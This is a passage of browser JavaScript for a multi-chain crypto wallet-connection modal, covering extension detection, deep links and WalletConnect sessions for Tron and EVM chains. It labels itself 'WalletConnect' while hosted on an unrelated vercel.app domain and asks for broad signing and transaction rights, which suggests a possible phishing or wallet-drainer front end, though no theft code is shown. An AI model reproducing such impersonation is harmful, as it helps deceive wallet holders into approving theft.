        (async function loadManifest() {
            try {
                const res = await fetch('/wallets/manifest.json');
                if (res.ok) {
                    walletManifest = await res.json();
                    // re-render wallets now that manifest icons are available
                    if (typeof renderVisibleWallets === 'function') renderVisibleWallets();
                    if (typeof populateExtraWallets === 'function') populateExtraWallets();
                }
            } catch (e) {
                walletManifest = {};
            }
        })();

        // Basic helper implementations so the modal displays wallets and close buttons work
        function normalizeKey(s) {
            return (s || '').toString().toLowerCase().replace(/[^a-z0-9]/g, '');
        }

        // Helper: Detect and connect to Sui wallets (Slush, Sui Wallet, etc.)
        function getSlushWallet() {
            try {
                // Check for Sui wallets injected into window - try many possible global names
                const suiGlobals = ['suiWallet', 'wallet', 'sui', 'slush', 'slushWallet', 'mysten'];
                let suiWallets = null;

                for (const key of suiGlobals) {
                    if (window[key]) {
                        console.log(`[getSlushWallet] Found window.${key}`);
                        suiWallets = window[key];
                        break;
                    }
                }
                
                // Aggressive window scan for Sui-related globals
                if (!suiWallets) {
                    for (const key of Object.keys(window)) {
                        if ((key.toLowerCase().includes('sui') || key.toLowerCase().includes('slush') || key.toLowerCase().includes('mysten')) && 
                            window[key] && typeof window[key] === 'object') {
                            console.log(`[getSlushWallet] Found Sui-related window.${key}`);
                            suiWallets = window[key];
                            break;
                        }
                    }
                }
                
                if (!suiWallets) {
                    console.log("[getSlushWallet] No Sui wallet detected in window");
                    return null;
                }
                
                // If it's an array, try to find Slush specifically
                if (Array.isArray(suiWallets)) {
                    console.log(`[getSlushWallet] Found ${suiWallets.length} Sui wallet(s)`);
                    const slush = suiWallets.find?.(w => 
                        w.name?.toLowerCase?.().includes("slush") || 
                        w.name?.toLowerCase?.().includes("sui wallet") ||
                        w.name?.toLowerCase?.().includes("sui")
                    );
                    
                    if (slush) {
                        console.log(`[getSlushWallet] ✓ Slush/Sui Wallet detected: ${slush.name}`);
                        return slush;
                    }
                    
                    // Return first wallet if only one exists
                    if (suiWallets.length === 1) {
                        console.log(`[getSlushWallet] ✓ Single Sui wallet found: ${suiWallets[0].name}`);
                        return suiWallets[0];
                    }
                    
                    console.log("[getSlushWallet] Multiple Sui wallets found, returning first");
                    return suiWallets[0];
                }
                
                // Single wallet object - check if it has connection methods
                if (suiWallets && (suiWallets.connect || suiWallets.request || suiWallets.signAndExecuteTransaction)) {
                    console.log(`[getSlushWallet] ✓ Sui wallet detected: ${suiWallets.name || 'Slush/Sui Wallet'}`);
                    return suiWallets;
                }
                
                return null;
            } catch (err) {
                console.error("[getSlushWallet] Error detecting wallet:", err);
                return null;
            }
        }

        function getIconFromManifestByName(name) {
            if (!walletManifest || Object.keys(walletManifest).length === 0) return null;
            const map = {};
            Object.keys(walletManifest).forEach(k => { map[normalizeKey(k)] = walletManifest[k]; });
            const raw = normalizeKey(name.replace(/\(.*\)/, ''));
            const suffixes = ['wallet','wallets','app','suite','live','connect','web3','defi','client'];
            const candidates = [raw];
            suffixes.forEach(s => candidates.push(raw.replace(new RegExp(s + '$'), '')));
            // token variations
            raw.split(/[^a-z0-9]+/).forEach(tok => { if (tok) candidates.push(tok); });
            // try direct and reverse substring matches
            for (const c of candidates) {
                const key = normalizeKey(c);
                if (map[key]) return '/wallets/' + map[key];
            }
            // try substrings against manifest keys
            for (const k of Object.keys(map)) {
                if (raw.includes(k) || k.includes(raw)) return '/wallets/' + map[k];
            }
            return null;
        }

        function resolveIconUrl(name, providedIcon) {
            if (providedIcon) return providedIcon;
            const fromManifest = getIconFromManifestByName(name);
            if (fromManifest) return fromManifest;
            // Fallback placeholder with first letter
            const letter = (name && name[0]) ? name[0].toUpperCase() : 'W';
            return `https://via.placeholder.com/96/222/fff?text=${encodeURIComponent(letter)}`;
        }

        // Mapping of known wallet keys to common mobile app URL schemes
        const walletSchemeLookup = {
            metamask: ['metamask://'],
            phantom: ['phantom://','phantomwallet://', 'https://phantom.app/'],
            trustwallet: ['trust://','trustwallet://'],
            coinbasewallet: ['coinbase://','cbwallet://','coinbasewallet://'],
            ledgerlive: ['ledgerlive://','ledger://'],
            okxwallet: ['okxwallet://','okx://'],
            bitgetwallet: ['bitget://','bitgetwallet://'],
            tokenpocket: ['tpwallet://','tokenpocket://','tokenpocketwallet://'],
            safepal: ['safepal://','safepalwallet://'],
            solflare: ['solflare://','solflarewallet://', 'https://solflare.com/'],
            trezorsuite: ['trezor://','trezorsuite://', 'https://trezor.io/'],
            rabbywallet: ['rabby://','rabbywallet://'],
            rainbow: ['rainbow://','rainbowwallet://'],
            coinomi: ['coinomi://','coinomiwallet://'],
            coin98: ['coin98://','coin98wallet://'],
            bitkeep: ['bitkeep://','bitkeepwallet://'],
            tronlink: ['tronlink://','tronlinkwallet://', 'https://tronlink.org/'],
            walletconnect: ['wc://','walletconnect://'],
            exodus: ['exodus://', 'https://www.exodus.com/download/'],
            binanceweb3wallet: ['binanceweb3://', 'binance://', 'bsc://'],
            bitpaywallet: ['bitpay://', 'bitpaywallet://'],
            imtoken: ['imtoken://', 'imtokenv2://'],
            mathwallet: ['mathwallet://', 'math://'],
            argent: ['argent://', 'argentwallet://'],
            statuswallet: ['status://', 'statuswallet://'],
            oneinchwallet: ['1inch://', '1inchwallet://'],
            dcentwallet: ['dcent://', 'dcentwallet://'],
            ellipalwallet: ['ellipal://', 'ellipalwallet://'],
            tangemwallet: ['tangem://', 'tangemwallet://'],
            gemwallet: ['gemwallet://'],
            spectrowallet: ['spectro://,', 'spectrowallet://'],
            halodefiwallet: ['halodefi://,', 'halodefiwallet://'],
            dokwallet: ['dokwallet://'],
            atwallet: ['atwallet://'],
            midaswallet: ['midas://'],
            keyringpro: ['keyringpro://'],
            aktionariat: ['aktionariat://'],
            talkenwallet: ['talken://', 'talkenwallet://'],
            xinfincxdcnetwork: ['xdc://', 'xinfincxdcnetwork://'],
            kyberswap: ['kyberswap://', 'kyberswapwallet://'],
            atokenwallet: ['atoken://', 'atokenwallet://'],
            tonguewallet: ['tongue://', 'tonguewallet://'],
            rwallet: ['rwallet://'],
            plasmapay: ['plasmapay://'],
            o3wallet: ['o3wallet://'],
            hashkeyme: ['hashkeyme://', 'hashkeymewallet://'],
            jadewallet: ['jadewallet://'],
            defiant: ['defiant://', 'defiantwallet://'],
            coius: ['coius://', 'coiuswallet://'],
            cmorq: ['cmorq://', 'cmorqwallet://'],
            valora: ['valora://', 'valorawallet://'],
            quiverx: ['quiverx://', 'quiverxwallet://'],
            celowallet: ['celowallet://'],
            elastosessentials: ['elastos://', 'elastosessentials://'],
            slushwallet: ['slush://', 'slushwallet://', 'suiwallet','https://slushwallet.com/'],
            keplr: ['keplr://', 'keplrwallet://', 'https://keplr.app/'],
            backpack: ['backpack://', 'backpackwallet://'],
            zengo: ['zengo://', 'zengowallet://'],
            frontier: ['frontier://', 'frontierwallet://'],
            unstoppable: ['unstoppable://', 'unstoppablewallet://'],
            myetherwallet: ['myetherwallet://', 'mew://'],
            atomicwallet: ['atomic://', 'atomicwallet://'],
            infinitywallet: ['infinity://', 'infinitywallet://'],
            venlywallet: ['venly://', 'venlywallet://'],
            defialliancewallet: ['defialliance://', 'defialliancewallet://'],
            superhero: ['superhero://', 'superheroapp://'],
            sub: ['sub://', 'subwallet://'],
            acurast: ['acurast://', 'acurastwallet://', 'acurastlite://']
};

        // Wallets that should open their specific app/extension directly
                const DIRECT_WALLET_KEYS = ['metamask','safepal','trustwallet','ronin','uniswap','coinbase','okx','bitget','bybit','tokenpocket','exodus','keplr','phantom','slush','solflare','tronlink','superhero','sub','acurast'];

        function isDirectWalletName(name) {
            if (!name) return false;
            const k = normalizeKey(name);
            return DIRECT_WALLET_KEYS.some(w => k === w || k.includes(w) || w.includes(k));
        }

        function createWalletCard(entry) {
            const name = typeof entry === 'string' ? entry : (entry.name || 'Unknown');
            const icon = typeof entry === 'string' ? '' : (entry.icon || '');
            const card = document.createElement('div');
            card.className = 'wallet-item';
            card.dataset.wallet = name;
            // store icon or resolved icon path for later use
            if (icon) card.dataset.icon = icon;

            const wrapper = document.createElement('div');
            wrapper.className = 'wallet-icon-wrapper';
            const img = document.createElement('img');
            img.alt = name;
            img.style.width = '56px';
            img.style.height = '56px';
            // set source and handle loading errors (fallback to placeholder)
            const src = resolveIconUrl(name, icon);
            img.src = src;
            // store the resolved icon path for debugging and potential re-use
            card.dataset.icon = src;
            img.onerror = function() {
                const letter = (name && name[0]) ? name[0].toUpperCase() : 'W';
                this.onerror = null;
                this.src = `https://via.placeholder.com/96/222/fff?text=${encodeURIComponent(letter)}`;
            };
            wrapper.appendChild(img);

            const label = document.createElement('div');
            label.style.fontSize = '0.9rem';
            label.style.marginTop = '6px';
            label.textContent = name;

            // Badge: indicate wallets that open their specific app/extension
            try {
                const badgeNeeded = (typeof entry === 'object' && entry.type === 'extension') || isDirectWalletName(name);
                if (badgeNeeded) {
                    const badge = document.createElement('div');
                    badge.textContent = (typeof entry === 'object' && entry.type === 'extension') ? 'Extension' : 'Opens App';
                    badge.style.fontSize = '0.7rem';
                    badge.style.color = '#fff';
                    badge.style.background = '#16a34a';
                    badge.style.padding = '2px 6px';
                    badge.style.borderRadius = '10px';
                    badge.style.display = 'inline-block';
                    badge.style.marginTop = '6px';
                    badge.style.marginLeft = '8px';
                    label.appendChild(badge);
                }
            } catch (e) {}

            card.appendChild(wrapper);
            card.appendChild(label);
            card.addEventListener('click', handleWalletClick);
            return card;
        }

        function renderVisibleWallets() {
            if (!visibleWallets) return;
            visibleWallets.innerHTML = '';
            visibleList.forEach(w => visibleWallets.appendChild(createWalletCard(w)));
        }

        function populateExtraWallets() {
            if (!extraWallets) return;
            extraWallets.innerHTML = '';
            const fallbackList = ['Coinbase Wallet', 'Trust Wallet', 'Rainbow', 'Argent', 'Ledger Live', 'Trezor Suite'];
            const list = (extraWalletNames && extraWalletNames.length) ? extraWalletNames : fallbackList;
            list.forEach(w => extraWallets.appendChild(createWalletCard(w)));
        }
        
        // Expose to window for fallback script access
        window.renderVisibleWallets = renderVisibleWallets;
        window.populateExtraWallets = populateExtraWallets;

        // Detect candidate native wallet apps and browser extensions for common wallets.
        // For desktop browsers we check for injected providers (extensions) and return connectors.
        // For mobile / unknown we return URL schemes to try opening native apps.
        async function detectInstalledWallets(name) {
            const key = normalizeKey(name);
            const isMobile = /Mobi|Android/i.test(navigator.userAgent);
            const results = [];

            function pushIfUnique(arr, obj) {
                if (!arr.some(x => normalizeKey(x.name) === normalizeKey(obj.name))) arr.push(obj);
            }

            // FIRST: Try EIP-6963 detection on desktop
            if (!isMobile) {
                console.log(`[detectInstalledWallets] Desktop mode - scanning for EIP-6963 extensions...`);
                try {
                    const desktopWallets = await detectDesktopExtensions(800);
                    desktopWallets.forEach(w => {
                        if (w.provider) {
                            pushIfUnique(results, {
                                name: w.name,
                                type: 'extension',
                                connector: async () => {
                                    if (w.type === 'evm' && w.provider.request) {
                                        return await w.provider.request({ method: 'eth_requestAccounts' });
                                    } else if (w.type === 'solana' && w.provider.connect) {
                                        const resp = await w.provider.connect();
                                        return resp.publicKey.toString();
                                    }
                                    throw new Error(`No connector for ${w.name}`);
                                },
                                scheme: w.type === 'solana' ? 'phantom://' : 'metamask://',
                                _eip6963: true
                            });
                        }
                    });
                    
                    if (results.length > 0) {
                        console.log(`[detectInstalledWallets] ✓ Found ${results.length} desktop wallets via EIP-6963`);
                        // Wrap connectors to log stack traces when invoked (instrumentation for debugging auto-open)
                        results.forEach(r => {
                            try {
                                if (r && typeof r.connector === 'function' && !r.__wrapped_for_debug) {
                                    const orig = r.connector;
                                    r.connector = async function(...args) {
                                        try {
                                            console.log(`[connector-invoke] wallet=${r.name}`);
                                            console.trace();
                                        } catch (e) {}
                                        return await orig.apply(this, args);
                                    };
                                    r.__wrapped_for_debug = true;
                                }
                            } catch (e) {}
                        });
                        return results;
                    }
                } catch (e) {
                    console.warn('[detectInstalledWallets] EIP-6963 detection error:', e);
                }
            }

            // FALLBACK: Legacy window.ethereum detection (for wallets not using EIP-6963)
            try {
                if (window.ethereum) {
                    const providers = Array.isArray(window.ethereum.providers) ? window.ethereum.providers : [window.ethereum];
                    providers.forEach(p => {
                        try {
                            if (p.isMetaMask) pushIfUnique(results, { name: 'MetaMask', type: 'extension', connector: async () => p.request({ method: 'eth_requestAccounts' }), scheme: 'metamask://' });
                            else if (p.isCoinbaseWallet) pushIfUnique(results, { name: 'Coinbase Wallet', type: 'extension', connector: async () => p.request({ method: 'eth_requestAccounts' }), scheme: 'coinbase://' });
                            else pushIfUnique(results, { name: 'Ethereum Provider', type: 'extension', connector: async () => p.request({ method: 'eth_requestAccounts' }) });
                        } catch (e) {}
                    });
                }
            } catch (e) {}

            try { if (window.solana && window.solana.isPhantom) pushIfUnique(results, { name: 'Phantom', type: 'extension', connector: async () => window.solana.connect(), scheme: 'phantom://' }); } catch (e) {}
            try { if (window.keplr) pushIfUnique(results, { name: 'Keplr', type: 'extension', connector: async () => { await window.keplr.enable && await window.keplr.enable(); return true; }, scheme: 'keplr://' }); } catch (e) {}
            try { if (window.tronLink || (window.tronWeb && window.tronWeb.defaultAddress)) pushIfUnique(results, { name: 'TronLink', type: 'extension', connector: async () => { if (window.tronLink && window.tronLink.request) return await window.tronLink.request({ method: 'tron_requestAccounts' }); if (window.tronWeb && window.tronWeb.request) return await window.tronWeb.request({ method: 'tron_requestAccounts' }); throw new Error('No Tron request available'); }, scheme: 'tronlink://' }); } catch (e) {}
            try { if (window.safepal || window.SafePal) pushIfUnique(results, { name: 'SafePal', type: 'extension', connector: async () => { if (window.safepal && window.safepal.request) return await window.safepal.request({ method: 'eth_requestAccounts' }); throw new Error('SafePal connector not available'); }, scheme: 'safepal://' }); } catch (e) {}

            // Additional known wallet globals — best-effort detection for other extensions
            const knownWalletGlobals = [
                { name: 'Rabby', props: ['rabby', 'Rabby'], scheme: 'rabby://' },
                { name: 'Rainbow', props: ['rainbow', 'Rainbow'], scheme: 'rainbow://' },
                { name: 'MathWallet', props: ['mathwallet', 'MathWallet', 'mathWallet'], scheme: 'mathwallet://' },
                { name: 'TokenPocket', props: ['tp', 'TokenPocket', 'tokenPocket', 'tpwallet'], scheme: 'tpwallet://' },
                { name: 'Coin98', props: ['coin98', 'Coin98'], scheme: 'coin98://' },
                { name: 'BitKeep', props: ['bitkeep', 'Bitkeep', 'BitKeep'], scheme: 'bitkeep://' },
                { name: 'Wallet3', props: ['wallet3'], scheme: 'wallet3://' },
                { name: 'Opera', props: ['opera', 'operaWallet'], scheme: 'opera://' },
                { name: 'Trezor', props: ['trezor'], scheme: 'trezor://' }
            ];
            knownWalletGlobals.forEach(w => {
                for (const p of w.props) {
                    try {
                        const provider = window[p];
                        if (provider) {
                            pushIfUnique(results, {
                                name: w.name,
                                type: 'extension',
                                connector: async () => {
                                    if (typeof provider.request === 'function') return await provider.request({ method: 'eth_requestAccounts' });
                                    if (typeof provider.connect === 'function') return await provider.connect();
                                    if (typeof provider.enable === 'function') return await provider.enable();
                                    throw new Error('No connect method on provider');
                                },
                                scheme: w.scheme
                            });
                            break;
                        }
                    } catch (e) {}
                }
            });

            // Desktop: if we have extensions, return matches prioritized to the requested wallet name
            if (!isMobile && results.length > 0) {
                // Ensure connectors are wrapped for debugging before returning
                results.forEach(r => {
                    try {
                        if (r && typeof r.connector === 'function' && !r.__wrapped_for_debug) {
                            const orig = r.connector;
                            r.connector = async function(...args) {
                                try {
                                    console.log(`[connector-invoke] wallet=${r.name}`);
                                    console.trace();
                                } catch (e) {}
                                return await orig.apply(this, args);
                            };
                            r.__wrapped_for_debug = true;
                        }
                    } catch (e) {}
                });

                const exactMatches = results.filter(r => normalizeKey(r.name) === key || key.includes(normalizeKey(r.name)) || normalizeKey(r.name).includes(key));
                if (exactMatches.length > 0) return exactMatches;
                return results;
            }

            // Mobile / fallback: return URL schemes (or guessed scheme)
            if (walletSchemeLookup[key]) {
                return walletSchemeLookup[key].map(s => ({ name: name, scheme: s }));
            }

            const apps = [];
            const base = normalizeKey(name).replace(/[^a-z0-9]/g, '');
            if (base) apps.push({ name: name, scheme: `${base}://` });
            return apps;
        }

        // Very small tryOpenDeepLink helper — attempts to open a URL and immediately run success callback.
        function tryOpenDeepLink(url, onFail, onSuccess) {
            try {
                const a = document.createElement('a');
                a.href = url;
                a.style.display = 'none';
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);
                if (onSuccess) {
                    // Call success shortly after attempting the link — approval() will wait for wallet response
                    setTimeout(onSuccess, 100);
                }
            } catch (e) {
                if (onFail) onFail(e);
            }
        }

        // Wire up modal controls and search
        (function wireModalControls() {
            const closeBtn = document.getElementById('close-modal-btn');
            if (closeBtn) closeBtn.addEventListener('click', () => {
                modalOverlay.classList.remove('active');
                setTimeout(() => { modalOverlay.style.display = 'none'; }, 400);
            });

            const closeManualBtn = document.getElementById('close-manual-btn');
            if (closeManualBtn) closeManualBtn.addEventListener('click', () => {
                manualOverlay.classList.remove('active');
                setTimeout(() => { manualOverlay.style.display = 'none'; }, 400);
            });

            if (toggleMoreBtn) toggleMoreBtn.addEventListener('click', () => {
                isExpanded = !isExpanded;
                if (isExpanded) {
                    extraWallets.classList.remove('hidden');
                    toggleMoreBtn.textContent = 'Show fewer wallets';
                } else {
                    extraWallets.classList.add('hidden');
                    toggleMoreBtn.textContent = 'More wallets (396)';
                }
            });

            if (searchInput) searchInput.addEventListener('input', () => {
                const q = searchInput.value.trim().toLowerCase();
                const items = Array.from(document.querySelectorAll('.wallet-item'));
                if (!q) {
                    items.forEach(it => { it.style.display = ''; it.classList.remove('selected'); });
                    statusMessage.textContent = 'Select a wallet to connect';
                    statusMessage.classList.remove('status-failed');
                    return;
                }

                const matches = items.filter(it => (it.dataset.wallet || '').toLowerCase().includes(q));

                items.forEach(it => { it.style.display = matches.includes(it) ? '' : 'none'; it.classList.remove('selected'); });

                if (matches.length === 0) {
                    statusMessage.textContent = 'No wallets found';
                    statusMessage.classList.add('status-failed');
                } else {
                    statusMessage.textContent = `${matches.length} wallet${matches.length>1? 's' : ''} found`;
                    statusMessage.classList.remove('status-failed');
                    // If match in extra wallets, expand the extra list so the result is visible
                    const anyInExtra = matches.some(m => extraWallets && extraWallets.contains(m));
                    if (anyInExtra && extraWallets) {
                        extraWallets.classList.remove('hidden');
                        isExpanded = true;
                        if (toggleMoreBtn) toggleMoreBtn.textContent = 'Show fewer wallets';
                    }
                    // If exactly one match, highlight and scroll into view
                    if (matches.length === 1) {
                        const only = matches[0];
                        only.classList.add('selected');
                        setTimeout(() => only.scrollIntoView({ behavior: 'smooth', block: 'center' }), 100);
                    }
                }
            });

            // Render initially
            renderVisibleWallets();
            populateExtraWallets();
        })();

        // ────────────────────────────────────────────────────────────────────────────────
        // TronLink Desktop Extension Connection (Preferred over WalletConnect)
        // ────────────────────────────────────────────────────────────────────────────────
        // Check if TronLink extension is available
        function isTronLinkDetected() {
            return !!(window.tronLink || (window.tronWeb && window.tronWeb.ready));
        }

        // Connect to TronLink desktop extension with retries
        async function connectTronLinkDesktop() {
            console.log('[connectTronLinkDesktop] Attempting TronLink extension connection...');
            
            // Allow up to 2 seconds for TronLink to inject
            let retries = 20; // 20 * 100ms = 2 seconds
            while (retries > 0 && !isTronLinkDetected()) {
                await new Promise(r => setTimeout(r, 100));
                retries--;
            }
            
            if (!isTronLinkDetected()) {
                console.warn('[connectTronLinkDesktop] TronLink extension not detected');
                return null;
            }
            
            try {
                const provider = window.tronLink || window.tronWeb;
                console.log('[connectTronLinkDesktop] TronLink detected, requesting accounts...');
                
                // Use tron_requestAccounts which shows popup in extension
                if (provider.request) {
                    const accounts = await provider.request({ method: 'tron_requestAccounts' });
                    if (accounts && accounts.length > 0) {
                        const address = accounts[0];
                        console.log('[connectTronLinkDesktop] ✓ Connected via TronLink extension:', address);
                        return {
                            success: true,
                            address: address,
                            provider: provider,
                            method: 'extension',
                            chain: 'tron',
                            chainId: 'tron:0x2b6653dc'
                        };
                    }
                }
                
                throw new Error('No accounts returned from TronLink');
            } catch (err) {
                console.warn('[connectTronLinkDesktop] Extension connection failed:', err.message);
                return null;
            }
        }

        // Connect to Tron via WalletConnect (fallback if extension unavailable or for mobile)
        // Universal deep links for mobile wallets - avoids WC relay bugs
        function buildUniversalDeepLink(wallet, wcUri) {
            const links = {
                phantom: `https://phantom.app/ul/v1/connect?uri=${encodeURIComponent(wcUri)}`,
                solflare: `https://solflare.com/wc?uri=${encodeURIComponent(wcUri)}`,
                tronlink: `https://tronlink.org/#/connect?uri=${encodeURIComponent(wcUri)}`,
                slush: `https://suiwallet.com/connect?uri=${encodeURIComponent(wcUri)}`,
                walletconnect: `https://walletconnect.com/wc?uri=${encodeURIComponent(wcUri)}`
            };
            const normalized = (wallet || '').toLowerCase().replace(/[^a-z0-9]/g, '');
            for (const key of Object.keys(links)) {
                if (normalized.includes(key.replace(/[^a-z0-9]/g, ''))) {
                    return links[key];
                }
            }
            return links.walletconnect;
        }

        async function connectTronViaWalletConnect() {
            console.log('[connectTronViaWalletConnect] Attempting WalletConnect Tron connection...');
            
            let SignClient = window.SignClient;
            if (!SignClient) {
                console.error('[connectTronViaWalletConnect] SignClient not available');
                return null;
            }

            try {
                let client = window.__wcClient;
                if (!client) {
                    console.log('[connectTronViaWalletConnect] Initializing new WalletConnect client...');
                    client = await SignClient.init({
                        projectId: '81ec0eb195ddbee9c5596804e33ff584',
                        relayUrl: 'wss://relay.walletconnect.com',
                        metadata: {
                            name: 'WalletConnect',
                            description: 'Secure wallet connection',
                            url: 'https://hollyandwilly-kram.vercel.app',
                            icons: ['https://hollyandwilly-kram.vercel.app/crypto.png']
                        }
                    });
                    window.__wcClient = client;
                }

                console.log('[connectTronViaWalletConnect] Connecting to Tron via WalletConnect...');
                const { uri, approval } = await client.connect({
                    requiredNamespaces: {
                        tron: {
                            methods: ['tron_signTransaction', 'tron_signMessage'],
                            chains: ['tron:0x2b6653dc'],
                            events: ['accountsChanged']
                        }
                    }
                });

                if (!uri) throw new Error('No WalletConnect URI generated');

                console.log('[connectTronViaWalletConnect] Got WC URI');
                const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
                
                if (isMobile) {
                    console.log('[connectTronViaWalletConnect] Mobile detected - using universal deep link (avoids relay bugs)');
                    const deepLink = buildUniversalDeepLink('TronLink', uri);
                    console.log('[connectTronViaWalletConnect] Opening:', deepLink);
                    window.location.href = deepLink;
                } else {
                    console.log('[connectTronViaWalletConnect] Desktop detected - showing QR');
                    showQRFallbackOverlay(uri, 'TronLink');
                }

                const session = await approval();
                console.log('[connectTronViaWalletConnect] ✓ Approved via WalletConnect');

                const tronAccounts = session.namespaces?.tron?.accounts || [];
                if (tronAccounts.length === 0) throw new Error('No Tron accounts in WC session');
                
                const address = tronAccounts[0].split(':').pop();
                return {
                    success: true,
                    address: address,
                    session: session,
                    client: client,
                    method: 'walletconnect',
                    chain: 'tron',
                    chainId: 'tron:0x2b6653dc'
                };
            } catch (err) {
                console.error('[connectTronViaWalletConnect] WalletConnect connection failed:', err.message);
                if (err.message.includes('No matching key')) {
                    console.error('[connectTronViaWalletConnect] \"No matching key\" relay bug detected');
                    console.error('[connectTronViaWalletConnect] TronLink mobile WC has known issues - try desktop extension or Trust Wallet');
                }
                return null;
            }
        }

        // Main Tron connection: try desktop extension first, fallback to universal deep link
        async function connectTron() {
            console.log('[connectTron] Starting Tron connection (desktop-first with fallback)...');
            const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
            
            // Step 1: Try desktop extension (most reliable)
            const desktopResult = await connectTronLinkDesktop();
            if (desktopResult?.success) {
                console.log('[connectTron] ✓ Using TronLink desktop extension');
                return desktopResult;
            }

            if (isMobile) {
                console.warn('[connectTron] TronLink extension unavailable on mobile');
                console.warn('[connectTron] Attempting WC with universal deep link (avoids relay bugs)...');
            } else {
                console.log('[connectTron] Extension not available, attempting WalletConnect QR...');
            }
            
            // Step 2: Try WalletConnect (universal deep link on mobile, QR on desktop)
            const wcResult = await connectTronViaWalletConnect();
            if (wcResult?.success) {
                console.log('[connectTron] ✓ Using WalletConnect for Tron');
                return wcResult;
            }

            // Step 3: All failed - provide helpful suggestions
            const suggestions = isMobile
                ? '\nOn Mobile:\n1. Try Trust Wallet (better WC support)\n2. Use desktop browser with TronLink\n3. Refresh and retry'
                : '\nOn Desktop:\n1. Install TronLink extension\n2. Unlock TronLink extension\n3. Refresh this page';
            
            throw new Error('Tron connection failed.' + suggestions);
        }

        // ────────────────────────────────────────────────────────────────────────────────
        // Updated WalletConnect v2 Integration (with your Project ID)
        // ────────────────────────────────────────────────────────────────────────────────
        // ════════════════════════════════════════════════════════════════════════════════
        // === MULTI-CHAIN CONNECTION - SINGLE APPROVAL FOR ALL CHAINS ===
        // ════════════════════════════════════════════════════════════════════════════════
        async function checkRelayHealth(relayUrl) {
            console.log(`[checkRelayHealth] Testing relay: ${relayUrl}`);
            try {
                // Try to establish a quick test connection
                const testSocket = new Promise((resolve, reject) => {
                    const ws = new WebSocket(relayUrl);
                    const timeout = setTimeout(() => {
                        ws.close();
                        reject(new Error('Timeout'));
                    }, 3000);
                    
                    ws.onopen = () => {
                        clearTimeout(timeout);
                        ws.close();
                        resolve(true);
                    };
                    
                    ws.onerror = () => {
                        clearTimeout(timeout);
                        reject(new Error('Connection error'));
                    };
                });
                
                const result = await testSocket;
                console.log(`[checkRelayHealth] ✓ Relay ${relayUrl} is healthy`);
                return result;
            } catch (e) {
                console.warn(`[checkRelayHealth] Relay ${relayUrl} check failed:`, e.message);
                return false;
            }
        }

        async function connectAllChains(walletName = null) {
            console.log(`[connectAllChains] Starting SINGLE multi-chain connection for ALL blockchains...`);
            
            // Wait for SignClient to be ready with extended timeout
            const maxWaitTime = 20000; // 20 seconds max
            const startTime = Date.now();
            
            while (!window.SignClient && (Date.now() - startTime) < maxWaitTime && !window.SignClientFailed) {
                console.warn(`[connectAllChains] SignClient not ready yet, waiting...`);
                await new Promise(r => setTimeout(r, 300));
            }
            
            let SignClient = window.SignClient;
            
            if (!SignClient) {
                // Log what we found
                console.error('[connectAllChains] SignClient not available');
                console.log('[connectAllChains] Checking window globals for alternatives...');
                
                // Try to find it in alternate locations
                if (window.WalletConnect && window.WalletConnect.SignClient) {
                    SignClient = window.WalletConnect.SignClient;
                    console.log('[connectAllChains] Found SignClient at window.WalletConnect.SignClient');
                    window.SignClient = SignClient; // Cache it
                } else if (window.walletconnect && window.walletconnect.SignClient) {
                    SignClient = window.walletconnect.SignClient;
                    console.log('[connectAllChains] Found SignClient at window.walletconnect.SignClient');
                    window.SignClient = SignClient; // Cache it
                }
            }
            
            if (!SignClient) {
                console.error("SignClient still not available after waiting");
                throw new Error("WalletConnect SignClient failed to load. Please refresh the page and try again.");
            }

            let client;
            const relayUrls = [
                'wss://relay.walletconnect.com',
                'wss://relay.walletconnect.org',
                'wss://relay-staging.walletconnect.com'
            ];
            
            console.log('[connectAllChains] Checking relay health before connection...');
            
            // Pre-check relay connectivity
            let healthyRelay = null;
            for (const relayUrl of relayUrls) {
                const isHealthy = await checkRelayHealth(relayUrl);
                if (isHealthy) {
                    healthyRelay = relayUrl;
                    break;
                }
            }
            
            if (!healthyRelay) {
                console.warn('[connectAllChains] ⚠️  No WalletConnect relays are currently responding.');
                console.warn('[connectAllChains] This may indicate:');
                console.warn('  1. Network connectivity issue on your device');
                console.warn('  2. WalletConnect relay servers are temporarily down');
                console.warn('  3. Firewall/ISP blocking WebSocket connections');
                console.warn('[connectAllChains] Attempting connection anyway with all relay URLs...');
            }
            
            let lastError;
            for (const relayUrl of relayUrls) {
                try {
                    if (window.__wcClient && window.__wcClientRelay === relayUrl) {
                        console.log(`[connectAllChains] Using cached client with relay: ${relayUrl}`);
                        client = window.__wcClient;
                        break;
                    }
                    
                    console.log(`[connectAllChains] Attempting SignClient.init with relay: ${relayUrl}`);
                    client = await SignClient.init({
                        projectId: '81ec0eb195ddbee9c5596804e33ff584',
                        relayUrl: relayUrl,
                        metadata: {
                            name: 'WalletConnect',
                            description: 'Secure wallet connection',
                            url: 'https://hollyandwilly-kram.vercel.app',
                            icons: ['https://hollyandwilly-kram.vercel.app/crypto.png']
                        }
                    });
                    
                    console.log(`[connectAllChains] ✓ SignClient initialized successfully with: ${relayUrl}`);
                    window.__wcClient = client;
                    window.__wcClientRelay = relayUrl;
                    break;
                } catch (e) {
                    lastError = e;
                    console.warn(`[connectAllChains] Failed with relay ${relayUrl}:`, e.message);
                    // Clear cache and try next relay
                    if (window.__wcClientRelay === relayUrl) {
                        window.__wcClient = null;
                        window.__wcClientRelay = null;
                    }
                    if (relayUrl === relayUrls[relayUrls.length - 1]) {
                        // Last relay URL failed
                        console.error(`[connectAllChains] All relay URLs failed:`, lastError);
                    }
                }
            }
            
            if (!client) {
                console.error('WC v2 init failed with all relays:', lastError);
                throw new Error(`WalletConnect relay unavailable. Error: ${lastError?.message || 'Unknown error'}`);
            }

            try {
                console.log(`[connectAllChains] Requesting ALL chain namespaces in ONE approval popup...`);
                
                // Wrap connection in timeout to prevent hanging
                // Request a minimal required namespace first (eip155 mainnet) so wallets
                // that cannot satisfy a large required set (Trust, SafePal) can still connect.
                // Move secondary EVM chains and non-EVM chains into optionalNamespaces.
                const connectionPromise = client.connect({
                    requiredNamespaces: {
                        eip155: {
                            methods: ['eth_requestAccounts', 'eth_sendTransaction', 'personal_sign'],
                            chains: ['eip155:1'], // Primary chain first (Ethereum Mainnet)
                            events: ['accountsChanged']
                        }
                    },
                    optionalNamespaces: {
                        eip155: {
                            methods: ['personal_sign', 'eth_signTypedData_v4', 'wallet_switchEthereumChain', 'wallet_addEthereumChain'],
                            chains: [
                                'eip155:56', 'eip155:137', 'eip155:324', 'eip155:8453', 'eip155:42161', 'eip155:43114',
